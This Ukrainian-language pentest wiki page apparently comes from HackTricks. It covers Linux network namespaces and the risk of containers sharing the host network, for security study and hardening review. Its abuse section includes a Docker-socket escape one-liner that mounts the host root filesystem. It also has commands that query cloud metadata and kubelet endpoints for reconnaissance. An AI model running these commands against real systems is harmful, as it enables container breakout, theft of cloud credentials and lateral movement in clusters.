# Мережевий простір імен

{{#include ../../../../../banners/hacktricks-training.md}}

## Огляд

Мережевий простір імен ізолює ресурси, пов'язані з мережею, такі як інтерфейси, IP-адреси, таблиці маршрутизації, стан ARP/neighbor, правила брандмауера, сокети та вміст файлів на кшталт `/proc/net`. Саме тому контейнер може мати те, що виглядає як власний `eth0`, власні локальні маршрути та власний loopback-пристрій, не володіючи реальним мережевим стеком хоста.

З точки зору безпеки це важливо, бо ізоляція мережі — це набагато більше, ніж прив'язка портів. Приватний мережевий простір імен обмежує те, що робоче навантаження може безпосередньо спостерігати або переналаштувати. Якщо цей простір імен стає спільним з хостом, контейнер раптово може отримати видимість слухачів хоста, локальних сервісів хоста та мережевих контрольних точок, які ніколи не мали бути доступні додатку.

## Принцип роботи

Щойно створений мережевий простір імен починається з порожнього або майже порожнього мережевого оточення до підключення інтерфейсів. Рантайми контейнерів потім створюють або підключають віртуальні інтерфейси, призначають адреси та налаштовують маршрути, щоб робоче навантаження мало очікуване з'єднання. У розгортаннях на основі bridge це зазвичай означає, що контейнер бачить інтерфейс на основі veth, підключений до bridge хоста. У Kubernetes CNI plugins виконують еквівалентну підготовку для мережі Pod.

Ця архітектура пояснює, чому `--network=host` або `hostNetwork: true` — це такі радикальні зміни. Замість отримання підготовленого приватного мережевого стеку робоче навантаження приєднується до фактичного стеку хоста.

## Лаб

Ви можете побачити майже порожній мережевий простір імен за допомогою:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
І ви можете порівняти звичайні та host-networked контейнери за допомогою:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Контейнер, що використовує мережу хоста, більше не має власного ізольованого вигляду сокетів та мережевих інтерфейсів. Сам по собі цей факт уже є суттєвим ще до того, як ви дізнаєтеся, які можливості має процес.

## Використання під час виконання

Docker та Podman зазвичай створюють приватний network namespace для кожного контейнера, якщо не налаштовано інакше. Kubernetes зазвичай надає кожному Pod власний network namespace, спільний для контейнерів всередині цього Pod, але відокремлений від хоста. Системи Incus/LXC також забезпечують розвинену ізоляцію на основі network namespace, часто з ширшим набором віртуальних мережевих конфігурацій.

Загальний принцип такий: приватна мережа є типовою межею ізоляції, тоді як використання мережі хоста — це явний вихід із цієї межі.

## Неправильні налаштування

Найважливіша неправильна конфігурація — це спільне використання простору імен мережі хоста. Це іноді роблять задля продуктивності, низькорівневого моніторингу або зручності, але це знімає одну з найчистіших меж ізоляції для контейнерів. Локальні для хоста служби стають досяжними більш прямим шляхом, сервіси, доступні лише через localhost, можуть стати доступними, а можливості на кшталт `CAP_NET_ADMIN` або `CAP_NET_RAW` стають набагато небезпечнішими, оскільки операції, які вони дозволяють, тепер застосовуються до мережевого середовища самого хоста.

Ще однією проблемою є надмірне надання мережевих capabilities навіть коли network namespace приватний. Приватний namespace допомагає, але він не робить raw sockets чи розширений контроль мережі нешкідливими.

## Зловживання

У слабо ізольованих налаштуваннях нападники можуть інспектувати служби, що слухають на хості, отримувати доступ до management endpoints, прив'язаних лише до loopback, перехоплювати або втручатися в трафік залежно від конкретних можливостей та середовища, або переналаштовувати маршрутизацію й стан фаєрвола, якщо присутній `CAP_NET_ADMIN`. У кластері це також може полегшити lateral movement і control-plane reconnaissance.

Якщо ви підозрюєте використання мережі хоста, почніть з підтвердження того, що видимі інтерфейси та слушачі належать хосту, а не ізольованій мережі контейнера:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Сервіси, доступні лише через loopback, часто є першою цікавою знахідкою:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Якщо присутні мережеві можливості, перевірте, чи може робоче навантаження переглядати або змінювати видимий стек:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
У кластерних або cloud-середовищах, host networking також виправдовує швидкий локальний recon метаданих та сервісів, суміжних із control-plane:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Повний приклад: Host Networking + Local Runtime / Kubelet Access

Host networking не надає автоматично host root, але часто відкриває сервіси, які навмисно доступні лише з самого node. Якщо один із цих сервісів слабо захищений, host networking стає прямим шляхом privilege-escalation.

Docker API на localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet на localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Наслідки:

- пряме компрометування хоста, якщо local runtime API відкритий без належного захисту
- cluster reconnaissance або lateral movement, якщо kubelet або local agents досяжні
- traffic manipulation або denial of service при поєднанні з `CAP_NET_ADMIN`

## Перевірки

Мета цих перевірок — визначити, чи має процес приватний мережевий стек, які маршрути та прослуховувачі видимі, і чи огляд мережі вже виглядає як хостовий ще до того, як ви почнете тестувати capabilities.
```bash
readlink /proc/self/ns/net   # Network namespace identifier
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
- Якщо ідентифікатор namespace або видимий набір інтерфейсів виглядає як host, host networking може вже використовуватися.
- `ss -lntup` особливо корисна, оскільки вона виявляє loopback-only listeners і local management endpoints.
- Маршрути, назви інтерфейсів і контекст firewall стають набагато важливішими, якщо присутній `CAP_NET_ADMIN` або `CAP_NET_RAW`.

Під час перегляду container завжди оцінюйте network namespace разом із capability set. Host networking плюс сильні network capabilities — зовсім інша позиція порівняно з bridge networking плюс вузький default capability set.
